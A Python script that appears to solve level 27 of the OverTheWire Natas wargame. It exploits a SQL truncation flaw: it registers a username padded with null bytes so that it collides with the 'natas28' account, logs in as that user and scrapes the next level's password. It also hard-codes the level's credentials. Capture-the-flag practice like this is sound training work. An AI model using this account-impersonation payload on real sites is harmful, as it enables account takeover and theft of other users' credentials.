# Vulnerability: SQL Truncation

import re
import requests
import colorama
from colorama import Fore, Style

# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

# Set the username and password for authentication
username = 'natas27'
password = 'PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3'

# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/index.php'

# Create a session and set the authorization credentials
session = requests.Session()

# Request to create a new user
session.post(url, data={"username": "natas28" + '\x00' * 64 + "anything", "password": "anything"},
             auth=(username, password))

# Request to login
resp = session.post(url, data={"username": "natas28", "password": "anything"}, auth=(username, password))

# Print the credential for the next level
password = re.search("\[password\] =&gt; (.*)", resp.text).group(1)
print(f"Natas 28: {password}")
